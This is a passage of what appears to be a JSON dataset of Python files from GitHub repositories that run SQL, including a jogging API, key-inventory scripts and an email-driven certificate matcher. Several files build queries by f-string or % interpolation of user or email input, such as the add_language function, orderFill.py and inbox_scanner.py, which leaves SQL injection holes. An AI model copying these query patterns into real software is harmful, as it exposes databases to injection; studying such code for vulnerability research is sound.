to_tsquery('Dark Knight')\")\n        res = cur.fetchall()\n        conn.commit()\n        return redirect(url_for('movies'))\n    except Exception as e:\n        return redirect(url_for('index'))\n\ndef add_language(lang):\n    try:\n        cur.execute(f\"INSERT INTO language (name) VALUES ('{lang}')\")\n    except Exception as e:\n        pass\n    cur.execute(f\"SELECT language_id FROM language where name='{lang}'\")\n    lang_id = cur.fetchone()[0]\n    if conn.commit():\n        return lang_id\n    return lang_id\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/amor71/sanic_jwt_showcase/blob/5a0a1d32b0bea893ec9129ae5e2358b82272ba2c",
        "file_path": "/Models/user.py",
        "source": "from sqlalchemy.sql import text\nfrom .dbhelper import engine\n\n\nclass User(object):\n    def __init__(\n        self, user_id, username, hashed_password, roll_id=1, *args, **kwargs\n    ):\n        self.user_id = user_id\n        self.username = username\n        self.hashed_password = hashed_password\n        self.roll_id = roll_id\n\n    def to_dict(self):\n        return {\"user_id\": self.user_id, \"username\": self.username}\n\n    def save(self):\n        connection = engine.connect()\n        trans = connection.begin()\n        try:\n            s = text(\n                \"INSERT INTO users(username, hashed_password, roll_id) \"\n                \"VALUES(:username, :hashed_password, :roll_id)\"\n            )\n            connection.execute(\n                s,\n                username=self.username,\n                hashed_password=self.hashed_password,\n                roll_id=self.roll_id,\n            )\n            trans.commit()\n        except:\n            trans.rollback()\n            raise\n        connection.close()\n\n    @classmethod\n    def get_by_username(cls, username):\n        assert engine\n        s = text(\n            \"SELECT user_id, username, hashed_password, roll_id \"\n            \"FROM users \"\n            \"WHERE username = :username AND expire_date is null\"\n        )\n        connection = engine.connect()\n        rc = connection.execute(s, username=username).fetchone()\n        if rc is not None:\n            rc = User(rc[0], rc[1], rc[2].decode(\"utf-8\"), rc[3])\n\n        connection.close()\n        return rc\n\n    @classmethod\n    def username_exists(cls, username):\n        assert engine\n        s = text(\n            \"SELECT * \"\n            \"FROM users \"\n            \"WHERE username = :username AND expire_date is null\"\n        )\n        connection = engine.connect()\n\n        rc = (\n            False\n            if connection.execute(s, username=username).fetchone() is None\n            else True\n        )\n        connection.close()\n        return rc\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/amor71/sanic_jwt_showcase/blob/5a0a1d32b0bea893ec9129ae5e2358b82272ba2c",
        "file_path": "/Routes/jogging_results.py",
        "source": "import datetime\nimport json\nfrom sanic import response\nfrom sanic.exceptions import SanicException, InvalidUsage, add_status_code\nfrom sanic_jwt.decorators import protected\nfrom jogging.Contectors.darksky import get_weather_condition\nfrom jogging.Routes.auth import retrieve_user\nfrom jogging.Models.jogging_result import JoggingResult\n\n\n@add_status_code(409)\nclass Conflict(SanicException):\n    pass\n\n\n@protected()\nasync def add_jogging_result(request, *args, **kwargs):\n    if (\n        request.json is None\n        or \"date\" not in request.json\n        or \"distance\" not in request.json\n        or \"time\" not in request.json\n        or \"location\" not in request.json\n    ):\n        raise InvalidUsage(\n            \"invalid payload (should be {date, distance, time, location})\"\n        )\n\n    distance = request.json[\"distance\"]\n    if distance <= 0:\n        raise InvalidUsage(\"distance needs to be positive\")\n\n    try:\n        date = datetime.datetime.strptime(\n            request.json[\"date\"], \"%Y-%m-%d\"\n        ).date()\n    except ValueError:\n        raise InvalidUsage(\"invalid date (should be 'YYYY-MM-DD')\")\n\n    latlong = request.json[\"location\"].split(\" \")\n\n    if len(latlong) != 2:\n        raise InvalidUsage(\"invalid location (should be 'LAT LONG')\")\n\n    try:\n        lat = float(latlong[0])\n        long = float(latlong[1])\n    except ValueError:\n        raise InvalidUsage(\n            \"invalid location (lat & long should be floating-point)\"\n        )\n\n    if not (-90.0 <= lat <= 90.0 and -180 <= long <= 180):\n        raise InvalidUsage(\n            \"invalid location (The latitude must be a number between -90 and 90 and the longitude between -180 and 180)\"\n        )\n\n    try:\n        time = int(request.json[\"time\"])\n    except ValueError:\n        raise InvalidUsage(\"invalid time (time should be an integer)\")\n\n    if time <= 0:\n        raise InvalidUsage(\"invalid time (time should be positive)\")\n\n    condition = await get_weather_condition(lat, long, date)\n\n    if condition is None:\n        raise InvalidUsage(\n            \"can't fetch running conditions for that location & time\"\n        )\n\n    user_id = retrieve_user(request, args, kwargs)[\"user_id\"]\n\n    jog = JoggingResult(\n        user_id,\n        request.json[\"location\"],\n        date,\n        distance,\n        time,\n        json.dumps(condition[\"data\"][0]),\n    )\n    jog.save()\n\n    return response.HTTPResponse(status=201)\n\n\n@protected()\nasync def get_jogging_results(request, *args, **kwargs):\n    page = int(request.args[\"page\"][0]) if \"page\" in request.args else 0\n    limit = int(request.args[\"count\"][0]) if \"count\" in request.args else 10\n\n    if page < 0 or limit <= 0:\n        raise InvalidUsage(\"invalid paging (page >= 0 and count > 0)\")\n\n    q_filter = request.args[\"filter\"][0] if \"filter\" in request.args else None\n    user_id = retrieve_user(request, args, kwargs)[\"user_id\"]\n\n    return response.json(\n        JoggingResult.load(user_id, q_filter, page, limit), status=200\n    )\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/amor71/sanic_jwt_showcase/blob/5a0a1d32b0bea893ec9129ae5e2358b82272ba2c",
        "file_path": "/Tests/test_jogging_results.py",
        "source": "import pytest\nfrom sanic import Sanic\nimport random\nimport json\nfrom jogging.main import config_app\nfrom jogging import config\nfrom jogging.Models.user import User\n\nusername = None\naccess_token = None\nrefresh_token = None\n\n\n@pytest.yield_fixture\ndef app():\n    config.app = Sanic(\"test_sanic_app\")\n    config_app()\n    yield config.app\n\n\n@pytest.fixture\ndef test_cli(loop, app, sanic_client):\n\n    global username\n    while username is None:\n        i = random.randint(1, 10000)\n        username = f\"amichay.oren+{i}@gmail.com\"\n        if User.username_exists(username):\n            username = None\n\n    return loop.run_until_complete(sanic_client(app))\n\n\nasync def test_positive_register_(test_cli):\n    data = {\"username\": username, \"password\": \"testing123G\"}\n    resp = await test_cli.post(\"/users\", data=json.dumps(data))\n    assert resp.status == 201\n\n\nasync def test_positive_login(test_cli):\n    data = {\"username\": username, \"password\": \"testing123G\"}\n    resp = await test_cli.post(\"/auth\", data=json.dumps(data))\n    resp_json = await resp.json()\n    print(resp_json)\n    global access_token\n    access_token = resp_json[\"access_token\"]\n    global refresh_token\n    refresh_token = resp_json[\"refresh_token\"]\n    assert access_token is not None\n    assert refresh_token is not None\n    assert resp.status == 200\n\n\nasync def test_negative_jogging_result(test_cli):\n    global access_token\n    global refresh_token\n    headers = {\"Authorization\": f\"Bearer {access_token}\"}\n    data = {\n        \"date\": \"1971-06-20\",\n        \"distance\": 2000,\n        \"time\": 405,\n        \"location\": \"32.0853 34.7818\",\n    }\n    resp = await test_cli.post(\n        \"/results\", headers=headers, data=json.dumps(data)\n    )\n    assert resp.status == 400\n\n\nasync def test_positive_jogging_result(test_cli):\n    global access_token\n    global refresh_token\n    headers = {\"Authorization\": f\"Bearer {access_token}\"}\n    data = {\n        \"date\": \"2015-06-20\",\n        \"distance\": 2000,\n        \"time\": 405,\n        \"location\": \"32.0853 34.7818\",\n    }\n    resp = await test_cli.post(\n        \"/results\", headers=headers, data=json.dumps(data)\n    )\n    assert resp.status == 201\n\n\nasync def test_positive_load_dataset(test_cli):\n    import csv\n\n    global access_token\n    global refresh_token\n    headers = {\"Authorization\": f\"Bearer {access_token}\"}\n\n    dsreader = csv.reader(open(\"jogging_dataset.csv\"), delimiter=\",\")\n    for row in dsreader:\n        data = {\n            \"date\": row[0],\n            \"location\": row[1],\n            \"distance\": int(row[2]),\n            \"time\": int(row[3]),\n        }\n        resp = await test_cli.post(\n            \"/results\", headers=headers, data=json.dumps(data)\n        )\n        assert resp.status == 201\n\n\nasync def test_negative_jogging_result_no_uath(test_cli):\n    global access_token\n    global refresh_token\n    data = {\n        \"date\": \"2015-06-20\",\n        \"distance\": 2000,\n        \"time\": 405,\n        \"location\": \"32.0853 34.7818\",\n    }\n    resp = await test_cli.post(\"/results\", data=json.dumps(data))\n    assert resp.status == 400\n\n\nasync def test_positive_get_all_results(test_cli):\n    global access_token\n    global refresh_token\n    headers = {\"Authorization\": f\"Bearer {access_token}\"}\n\n    resp = await test_cli.get(\"/results\", headers=headers)\n    resp_json = await resp.json()\n\n    assert resp.status == 200\n\n\nasync def test_positive_get_paging(test_cli):\n    global access_token\n    global refresh_token\n    headers = {\"Authorization\": f\"Bearer {access_token}\"}\n\n    resp = await test_cli.get(\"/results?page=0&count=2\", headers=headers)\n    resp_json = await resp.json()\n    assert resp.status == 200\n    assert len(resp_json) == 2\n\n    resp = await test_cli.get(\"/results?page=1&count=1\", headers=headers)\n    resp_json = await resp.json()\n    assert resp.status == 200\n    assert len(resp_json) == 1\n\n\nasync def test_negative_bad_paging(test_cli):\n    global access_token\n    global refresh_token\n    headers = {\"Authorization\": f\"Bearer {access_token}\"}\n\n    resp = await test_cli.get(\"/results?page=-1&count=2\", headers=headers)\n    assert resp.status == 400\n\n    resp = await test_cli.get(\"/results?page=1&count=0\", headers=headers)\n    assert resp.status == 400\n\n\nasync def test_positive_check_filters(test_cli):\n    global access_token\n    global refresh_token\n    headers = {\"Authorization\": f\"Bearer {access_token}\"}\n\n    resp = await test_cli.get(\n        \"/results?page=0&count=2&filter=date eq '2019-07-15'\", headers=headers\n    )\n    resp_json = await resp.json()\n    assert resp.status == 200\n    assert len(resp_json) == 1\n\n    resp = await test_cli.get(\n        \"/results?filter=(date lt '2018-01-01') AND (time lt 500)\",\n        headers=headers,\n    )\n    resp_json = await resp.json()\n    assert resp.status == 200\n    assert len(resp_json) == 4\n\n    resp = await test_cli.get(\n        \"/results?filter=distance ne 2000\", headers=headers\n    )\n    resp_json = await resp.json()\n    assert resp.status == 200\n    assert len(resp_json) == 8\n\n    resp = await test_cli.get(\n        \"/results?filter=distance ne 2000 and ((time lt 400) and (time gt 390))\",\n        headers=headers,\n    )\n    resp_json = await resp.json()\n    assert resp.status == 200\n    assert len(resp_json) == 0\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/cvSquiggles/Laser-Key-Inventory-Manager/blob/021e78a63695b9043cee037ed811e1b652af5fcb",
        "file_path": "/keyInventoryScripts/orderFill.py",
        "source": "#! /usr/bin/env python3\n#This is the orderFilledScript that updates the DB when you laser keys.\n\nfrom datetime import datetime\nimport pyodbc\nimport sys\nimport subprocess as sp\nfrom os import system\n\ndef clear():\n    system('cls')\n\ndef divider():\n    print('-' * 70)    \n\nDBNAME = \"laserInv\"\n\nopenConn = False\n\n#Determines wether the user has confirmed the information was typed correctly\nconfirmed = None\n\n#Determines wether the code should loop for more key entries\norderComplete = False\n\n#Marks that it's not the first loop, so don't ask for order number again\nmultiKeyOrder = False\n\n#Used to navigate loop where user decides to loop code or not\naddMore = None\n\nu_date = datetime.now()\n\nwhile orderComplete == False:\n    try:\n        #Taking order info from user\n        clear()\n        while confirmed != \"yes\":\n            print('Update the key inventory by entering the order information below.')\n            divider()\n            if multiKeyOrder == False:\n                u_orderNum = input('Order #: ')\n            u_keyNum = input('Key used (i.e. #29): #')\n            u_keysUsed = input('# of keys lased: ')\n            clear()\n            #Display info and have user confirm if it's correct before committing\n            divider()\n            print( \"{} \\n Order #: {} \\n Key #: {} \\n # of keys lased: {}\".format(\n                u_date, u_orderNum, u_keyNum, u_keysUsed))\n            divider()\n            confirmed = input(\"Is the information above correct? \")\n            #If yes then insert this information into the database\n            if confirmed == \"yes\":\n                clear()\n            #If no prompt them to re-enter the information properly\n            elif confirmed == \"no\":\n                clear()\n                print('Re-enter the information. \\n')\n            #If they enter anything other than yes or no, ask again\n            else:\n                clear()\n                print(\"Must answer yes or no, it's case sensitive because I'm lazy! \\n\")\n        #Reset confirmed for future while loops\n        confirmed = \"No\"\n        #Convert some of the user input values to int\n        u_keyNum = int(u_keyNum)\n        u_keysUsed = int(u_keysUsed)\n        #connect to db\n        print('Connecting to database...')\n        db = pyodbc.connect(Driver='{SQL Server Native Client 11.0}',\n                    Server='(LocalDB)\\\\LocalDB Laser',\n                    Database='laserInv',\n                    trusted_connection='yes')\n        openConn = True\n        #cursor 1 to get preCount value\n        c1 = db.cursor()\n        c1.execute(\"SELECT invCount FROM keyInventory WHERE keyNum = '%s';\" % u_keyNum)\n        try: \n            #Check to see if cursor one has A result.\n            u_preCount = (c1.fetchall()[0][0])\n        except IndexError:\n            divider()\n            print(\"ERROR: The key number you entered doesn't exist in the keyInventory table.\")\n            print(\"TIP: If you know you've typed it correctly, you'll have to add it to the Database with newKey.py\") \n            divider()\n            input(\"Press Enter to close...\")\n            if openConn == True:\n                db.close()\n                openConn = False\n            sys.exit()\n        except Exception:\n            if openConn == True:\n                db.close()\n                openConn = False\n                divider()\n                raise\n                divider()\n                input(\"Press Enter to close...\")\n            sys.exit()\n        #Grab datetime for this commit\n        u_date = datetime.now()\n        #Calculate postCount\n        u_postCount = u_preCount - u_keysUsed\n        #Insert all the information into ordersFilled Table\n        c2 = db.cursor()\n        c2.execute(\"INSERT INTO ordersFilled (submit_time, orderNum, keyNum, keysUsed, preCount, postCount) VALUES (?, ?, ?, ?, ?, ?);\", (u_date, u_orderNum,  u_keyNum, u_keysUsed, u_preCount, u_postCount))\n        c2.commit()\n        #Insert the new inventory count into keyInv Table\n        c3 = db.cursor()\n        c3.execute(\"UPDATE keyInventory SET invCount = ? WHERE keyNum = ?;\", (u_postCount, u_keyNum))\n        c3.commit()\n        clear()\n        print('Success! Database has been updated.')\n        addMore = None\n        #While loop to ask user if they want to remove more keys from inventory\n        while addMore != \"yes\" and addMore != \"no\": \n            addMore = input('Are there more keys on this order? ')\n            if addMore == 'yes':\n                #do nothing\n                multiKeyOrder = True\n                if openConn == True:\n                    db.close()\n                    openConn = False\n            elif addMore == 'no':\n                orderComplete = True\n                print('Okay, bye!')\n            else:\n                clear()\n                print(\"Must answer yes or no, it's case sensitive because I'm lazy!\")\n    except Exception:\n    \traise\n    finally:\n        if openConn == True:\n            db.close()\n            openConn = False\nsys.exit()",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/cvSquiggles/Laser-Key-Inventory-Manager/blob/021e78a63695b9043cee037ed811e1b652af5fcb",
        "file_path": "/keyInventoryScripts/resupply.py",
        "source": "#! /usr/bin/env python3\n#This is the resupply script, inserts resupply shipment info into keyInventory table\n\nfrom datetime import datetime\nimport pyodbc\nimport sys\nimport subprocess as sp\nfrom os import system\n\ndef clear():\n    system('cls')\n\ndef divider():\n    print('-' * 70)    \n\nDBNAME = \"laserInv\"\n\n#This variable is used throughout the code to track wether the connection is still\n#open, and generally that check will close it and set to false if it is.\nopenConn = False\n\n#Bool to determine wether code should loop or not.\nresupplyComplete = False\n\n#Bool to confirm user input is correct.\nconfirmed = None\n\n#Determines wether user wants to add more keys to inventory.\naddMore = None\n\n#If encapsulates the code, re-runs it if you say you want to enter more resupply info.\nwhile resupplyComplete == False:\n    try:\n        clear()\n        print('Update the key inventory by entering the key resupply info below.')\n        divider()\n        u_keyNum = input('Key # used (i.e. Key #29): #')\n        u_keysAdded = input('# of keys to add to inventory: ')\n        clear()\n        while confirmed != \"yes\":\n            divider()\n            print( \"Adding {} key {}'s to the inventory. \\nIs this correct?\".format(u_keysAdded, u_keyNum))\n            divider()\n            confirmed = input('Please enter ''yes'' or ''no'': ')\n            if confirmed == \"yes\":\n                #Do nothing\n                clear()\n            elif confirmed == \"no\":\n                clear()\n                print('Re-enter the information.')\n                u_keyNum = input('Key # used (i.e. Key #29): #')\n                u_keysAdded = input('# of keys to add to inventory:')\n            else:\n                clear()\n                print(\"Must answer yes or no, it's case sensitive because I'm lazy!\")\n        #If yes then proceed to insert this information into the database\n        #First reset confirmed status in case user adds more keys later.\n        confirmed = \"no\"\n        #Convert user input values to type int\n        u_keyNum = int(u_keyNum)\n        u_keysAdded = int(u_keysAdded)\n        #connect to db\n        print('Connecting to database...')\n        db = pyodbc.connect(Driver='{SQL Server Native Client 11.0}',\n                            Server='(LocalDB)\\\\LocalDB Laser',\n                            Database=DBNAME,\n                            trusted_connection='yes')\n        openConn = True\n        #cursor 1 to get preCount value\n        c1 = db.cursor()\n        c1.execute(\"SELECT invCount FROM keyInventory WHERE keyNum = '%s';\" % u_keyNum)\n        try:\n            #Check to see if cursor has A result\n            u_preCount = (c1.fetchall()[0][0])\n        except IndexError:\n            #If sql select statement gets no result\n            divider()\n            print(\"ERROR: The key number you entered doesn't exist in the keyInventory table.\")\n            print(\"TIP: If you know you've typed it correctly, you'll have to add it to the Database with newKey.py\") \n            divider()\n            input(\"Press enter to close...\")\n            if openConn == True:\n                db.close() \n                openConn = False\n            sys.exit()\n        except Exception:\n            #All other exceptions\n            if openConn == True:\n                db.close()\n                openConn = False\n            divider()\n            raise\n            divider()\n            input(\"Press enter to close...\")\n            sys.exit()\n        #If Sql result DOES contain a result, get datetime for this resupply\n        u_date = datetime.now()\n        #Calculate post resupply Count\n        u_postCount = u_preCount + u_keysAdded\n        #Insert the resupply information into the resupply table\n        c2 = db.cursor()\n        c2.execute(\"INSERT INTO resupply (submit_time, keyNum, keysAdded, preCount, postCount) VALUES (?, ?, ?, ?, ?);\", (u_date, u_keyNum, u_keysAdded, u_preCount, u_postCount))\n        c2.commit()\n        #Update the new inventory count into keyInv Table\n        c3 = db.cursor()\n        c3.execute(\"UPDATE keyInventory SET invCount = ? WHERE keyNum = ?;\", (u_postCount, u_keyNum))\n        c3.commit()\n        print('Success! Database has been updated.')\n        divider()\n        addMore = None\n        while addMore != \"yes\" and addMore != \"no\": \n            addMore = input('Would you like to add more keys to the inventory? ')\n            if addMore == 'yes':\n                #do nothing\n                if openConn == True:\n                    db.close()\n                    openConn = False\n            elif addMore == 'no':\n                resupplyComplete = True;\n                print('Okay, bye!')\n            else:\n                clear()\n                print(\"Must answer yes or no, it's case sensitive because I'm lazy!\")\n    except Exception:\n        if openConn == True:\n            db.close()\n            openConn = False\n        divider()\n        raise\n        divider()\n        input(\"Press enter to close...\")\n        sys.exit()\n    finally:\n        if openConn == True:\n            db.close()\n            openConn = False\nsys.exit()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/philya/ljbq/blob/bc0fc54db7ef14c022406b0487348fa8db0c6986",
        "file_path": "/ljbq/__init__.py",
        "source": "\nimport hashlib\nimport os\n\nimport pandas as pd\n\n\ndef query_hash(project_id, query_name, **query_params):\n\n    id_string = \"{}/{}?\".format(project_id, query_name)\n     \n    keylist = sorted(query_params.keys())\n\n    for key in keylist:\n        id_string += \"{}={}&\".format(key, query_params[key])\n\n    return hashlib.sha224(id_string.encode('utf8')).hexdigest()\n\n    \ndef get_result(project_id, query_name, query_params={}, query_dir='bqsql', cache_dir='bqcache', reload=False):\n\n    # compute file name and params hash\n    qhash = query_hash(project_id, query_name, **query_params)\n\n    # check if hash.pkl file exists or reload\n    cache_file_name = os.path.join(cache_dir, \"{}.pkl\".format(qhash))\n\n    if not reload and os.path.exists(cache_file_name):\n        res = pd.read_pickle(cache_file_name)\n    else:\n\n        # read query from file\n        query_fn = os.path.join(query_dir, \"{}.sql\".format(query_name))\n        with open(query_fn, 'r') as query_f:\n            query_templ = query_f.read()\n\n        # substitute parameters\n        query_str = query_templ.format(**query_params)\n\n        res = pd.io.gbq.read_gbq(query_str, project_id=project_id, dialect=\"standard\")\n\n        os.makedirs(cache_dir, exist_ok=True)\n        res.to_pickle(cache_file_name)\n\n    return res",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/confirmationbias616/certificate_checker/blob/bd1e42e85f5b5fb2a88cd7050c8d845dc3554fa5",
        "file_path": "/db_tools.py",
        "source": "import sqlite3\nfrom sqlite3 import Error\nimport pandas as pd\nimport sys\nimport logging\n\n\nlogger = logging.getLogger(__name__)\nlog_handler = logging.StreamHandler(sys.stdout)\nlog_handler.setFormatter(\n    logging.Formatter(\n        \"%(asctime)s - %(name)s - %(levelname)s - %(message)s - %(funcName)s - line %(lineno)d\"\n    )\n)\nlogger.addHandler(log_handler)\nlogger.setLevel(logging.INFO)\n\ndef create_connection(db_name='cert_db.sqlite3'):\n    try:\n        conn = sqlite3.connect(db_name)\n        return conn\n    except Error as e:\n        logger.critical(e)\n    return None\n\ndef dbtables_to_csv():\n    with create_connection() as conn:\n        table_names = conn.cursor().execute(\"SELECT name FROM sqlite_master WHERE type='table';\").fetchall()\n    table_names = [x[0] for x in table_names]\n    open_query = \"SELECT * FROM {}\"\n    for table in table_names:\n        with create_connection() as conn:\n            pd.read_sql(open_query.format(table), conn).to_csv('{}.csv'.format(table), index=False)\n\nif __name__=='__main__':\n    dbtables_to_csv()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/confirmationbias616/certificate_checker/blob/bd1e42e85f5b5fb2a88cd7050c8d845dc3554fa5",
        "file_path": "/inbox_scanner.py",
        "source": "from itertools import chain\nimport email\nimport imaplib\nimport json\nimport pandas as pd\nimport numpy as np\nimport re\nfrom urllib.parse import unquote\nfrom db_tools import create_connection\nfrom matcher import match\nimport traceback\nimport datetime\nimport os\nimport sys\nimport logging\nimport smtplib, ssl\n\nport = 465 # for SSL\nsmtp_server = \"smtp.gmail.com\"\nsender_email = \"dilfo.hb.release\"\nlookup_url = \"https://canada.constructconnect.com/dcn/certificates-and-notices/\"\n\nlogger = logging.getLogger(__name__)\nlog_handler = logging.StreamHandler(sys.stdout)\nlog_handler.setFormatter(\n    logging.Formatter(\n        \"%(asctime)s - %(name)s - %(levelname)s - %(message)s - %(funcName)s - line %(lineno)d\"\n    )\n)\nlogger.addHandler(log_handler)\nlogger.setLevel(logging.INFO)\n\nimap_ssl_host = 'imap.gmail.com'\nimap_ssl_port = 993\nusername = 'dilfo.hb.release'\ntry:\n    with open(\".password.txt\") as file: \n        password = file.read()\nexcept FileNotFoundError:  # no password if running in CI\n    pass\n\ndef process_as_form(email_obj):\n    dict_input = {\n        unquote(x.split('=')[0]):str(unquote(x.split('=')[1])).replace('+', ' ') for x in email_obj['content'].split('&')}\n    job_number = dict_input['job_number']\n    with create_connection() as conn:\n        try:\n            was_prev_closed = pd.read_sql(f\"SELECT * FROM df_dilfo WHERE job_number={job_number}\", conn).iloc[0].closed\n        except IndexError:\n            was_prev_closed = 0\n    receiver_email = re.findall('<?(\\S+@\\S+\\.\\w+)>?', email_obj[\"sender\"])[0].lower()\n    dict_input.update({\"receiver_email\": receiver_email})\n    try:\n        if dict_input['cc_email'] != '':\n            dict_input['cc_email'] += '@dilfo.com'\n    except KeyError:\n        pass\n    try:\n        dcn_key = dict_input.pop('link_to_cert')\n    except (IndexError, KeyError):\n        dcn_key = ''\n    if dcn_key:\n        try:\n            dcn_key = dcn_key.split('-notices/')[1]\n        except IndexError:\n            pass\n        dcn_key = re.findall('[\\w-]*',dcn_key)[0]\n    try:\n        dict_input.pop('instant_scan')\n        instant_scan = True\n    except (IndexError, KeyError):\n        instant_scan = False\n    if was_prev_closed:\n        logger.info(f\"job was already matched successfully and logged as `closed`. Sending e-mail!\")\n        # Send email to inform of previous match\n        with create_connection() as conn:\n            prev_match = pd.read_sql(\n                \"SELECT * FROM df_matched WHERE job_number=? AND ground_truth=1\",\n                conn, params=[job_number]).iloc[0]\n        verifier = prev_match.verifier\n        log_date = prev_match.log_date\n        dcn_key = prev_match.dcn_key\n        message = (\n        f\"From: Dilfo HBR Bot\"\n        f\"\\n\"\n        f\"To: {receiver_email}\"\n        f\"\\n\"\n        f\"Subject: Previously Matched: #{job_number}\"\n        f\"\\n\\n\"\n        f\"Hi {receiver_email.split('.')[0].title()},\"\n        f\"\\n\\n\"\n        f\"It looks like \"\n        f\"job #{job_number} corresponds to the following certificate:\\n\"\n        f\"{lookup_url}{dcn_key}\"\n        f\"\\n\\n\"\n        f\"This confirmation was provided by {verifier.split('.')[0].title()}\"\n        f\"{' on ' + log_date if log_date is not None else ''}.\"\n        f\"\\n\\n\"\n        f\"If any of the information above seems to be inaccurate, please reply \"\n        f\"to this e-mail for corrective action.\"\n        f\"\\n\\n\"\n        f\"Thanks,\\n\"\n\t\tf\"Dilfo HBR Bot\\n\"\n        )\n        try:\n            context = ssl.create_default_context()\n            with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:\n                server.login(sender_email, password)\n                server.sendmail(sender_email, [receiver_email], message)\n            logger.info(f\"Successfully sent an email to {receiver_email}\")\n        except (FileNotFoundError, NameError):\n            logger.info(\"password not available -> could not send e-mail\")\n        return\n    elif dcn_key:\n        dict_input.update({\"closed\": 1})\n        with create_connection() as conn:\n            df = pd.read_sql(\"SELECT * FROM df_matched\", conn)\n            match_dict_input = {\n                'job_number': dict_input['job_number'],\n                'dcn_key': dcn_key,\n                'ground_truth': 1,\n                'verifier': dict_input['receiver_email'],\n                'source': 'input',\n                'log_date': str(datetime.datetime.now().date()),\n                'validate': 0,\n            }\n            df = df.append(match_dict_input, ignore_index=True)\n            df = df.drop_duplicates(subset=[\"job_number\", \"dcn_key\"], keep='last')\n            df.to_sql('df_matched', conn, if_exists='replace', index=False)\n    else:\n        dict_input.update({\"closed\": 0})\n    with create_connection() as conn:\n        df = pd.read_sql(\"SELECT * FROM df_dilfo\", conn)\n        df = df.append(dict_input, ignore_index=True)\n        #loop through duplicates to drop the first records but retain their contacts\n        for dup_i in df[df.duplicated(subset=[\"job_number\"], keep='last')].index:\n            dup_job_number = df.iloc[dup_i].job_number\n            dup_receiver = df.iloc[dup_i].receiver_email\n            dup_cc = df.iloc[dup_i].cc_email\n            df = df.drop(dup_i)\n            try:\n                dup_addrs = '; '.join([x for x in dup_cc + dup_receiver if x]) # filter out empty addresses and join them into one string  \n                update_i = df[df.job_number==dup_job_number].index\n                df.loc[update_i,'cc_email'] = df.loc[update_i,'cc_email'] + '; ' + dup_addrs\n            except TypeError:\n                pass\n        df.to_sql('df_dilfo', conn, if_exists='replace', index=False)  # we're replacing here instead of appending because of the 2 previous lines\n        if instant_scan:\n            dilfo_query = \"SELECT * FROM df_dilfo WHERE job_number=?\"\n            with create_connection() as conn:\n                df_dilfo = pd.read_sql(dilfo_query, conn, params=[job_number])\n            hist_query = \"SELECT * FROM df_hist ORDER BY pub_date DESC LIMIT 2000\"\n            with create_connection() as conn:\n                df_web = pd.read_sql(hist_query, conn)\n            results = match(df_dilfo=df_dilfo, df_web=df_web, test=False)\n            if len(results[results.pred_match==1]) == 0:\n                message = (\n                    f\"From: Dilfo HBR Bot\"\n                    f\"\\n\"\n                    f\"To: {receiver_email}\"\n                    f\"\\n\"\n                    f\"Subject: Successful Project Sign-Up: #{job_number}\"\n                    f\"\\n\\n\"\n                    f\"Hi {receiver_email.split('.')[0].title()},\"\n                    f\"\\n\\n\"\n                    f\"Your information for project #{job_number} was logged \"\n                    f\"successfully but no corresponding certificates in recent \"\n                    f\"history were matched to it.\"\n                    f\"\\n\\n\"\n                    f\"Going forward, the Daily Commercial News website will be \"\n                    f\"scraped on a daily basis in search of your project. You \"\n                    f\"will be notified if a possible match has been detected.\"\n                    f\"\\n\\n\"\n                    f\"Thanks,\\n\"\n                    f\"Dilfo HBR Bot\\n\"\n                )\n                try:\n                    context = ssl.create_default_context()\n                    with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:\n                        server.login(sender_email, password)\n                        server.sendmail(sender_email, [receiver_email], message)\n                    logger.info(f\"Successfully sent an email to {receiver_email}\")\n                except (FileNotFoundError, NameError):\n                    logger.info(\"password not available -> could not send e-mail\")\n\ndef process_as_reply(email_obj):\n    job_number = email_obj['subject'].split(': #')[1]\n    feedback = re.findall(\"^[\\W]*([Oo\\d]){1}(?=[\\W]*)\", email_obj['content'].replace('#','').replace('link', ''))[0]\n    feedback = int(0 if feedback == ('O' or 'o') else feedback)\n    dcn_key = re.findall('\\w{8}-\\w{4}-\\w{4}-\\w{4}-\\w{12}', email_obj['content'])[0]\n    logger.info(f\"got feedback `{feedback}` for job #`{job_number}`\")\n    with create_connection() as conn:\n        was_prev_closed = pd.read_sql(f\"SELECT * FROM df_dilfo WHERE job_number={job_number}\", conn).iloc[0].closed\n    if was_prev_closed:\n        logger.info(f\"job was already matched successfully and logged as `closed`... skipping.\")\n        return\n    if feedback == 1:\n        logger.info(f\"got feeback that DCN key {dcn_key} was correct\")\n        update_status_query = \"UPDATE df_dilfo SET closed = 1 WHERE job_number = {}\"\n        with create_connection() as conn:\n            conn.cursor().execute(update_status_query.format(job_number))\n        logger.info(f\"updated df_dilfo to show `closed` status for job #{job_number}\")\n    with create_connection() as conn:\n        df = pd.read_sql(\"SELECT * FROM df_matched\", conn)\n        match_dict_input = {\n            'job_number': job_number,\n            'dcn_key': dcn_key,\n            'ground_truth': 1 if feedback == 1 else 0,\n            'multi_phase': 1 if feedback == 2 else 0,\n            'verifier': email_obj[\"sender\"],\n            'source': 'feedback',\n            'log_date': str(datetime.datetime.now().date()),\n            'validate': 0,\n        }\n        df = df.append(match_dict_input, ignore_index=True)\n        df = df.drop_duplicates(subset=[\"job_number\", \"dcn_key\"], keep='last')\n        df.to_sql('df_matched', conn, if_exists='replace', index=False)\n        logger.info(\n            f\"DCN key `{dcn_key}` was a \"\n            f\"{'successful match' if feedback == 1 else 'mis-match'} for job \"\n            f\"#{job_number}\"\n        )\n\ndef parse_email(data):\n    for response_part in data:\n        if isinstance(response_part, tuple):\n            msg = email.message_from_string(response_part[1].decode('UTF-8'))\n            sender = msg['from']\n            subject = msg['subject']\n            date = msg['date']\n            for part in msg.walk():\n                if part.get_content_type() == 'text/plain':\n                    content = part.get_payload(None, True).decode('UTF-8')\n                    break\n                else:\n                    content = ''\n            return sender, subject, date, content\n\ndef get_job_input_data():\n    server = imaplib.IMAP4_SSL(imap_ssl_host, imap_ssl_port)\n    server.login(username, password)\n    server.select('INBOX')\n    _, data = server.search(None, 'UNSEEN')  # UNSEEN or ALL\n    mail_ids 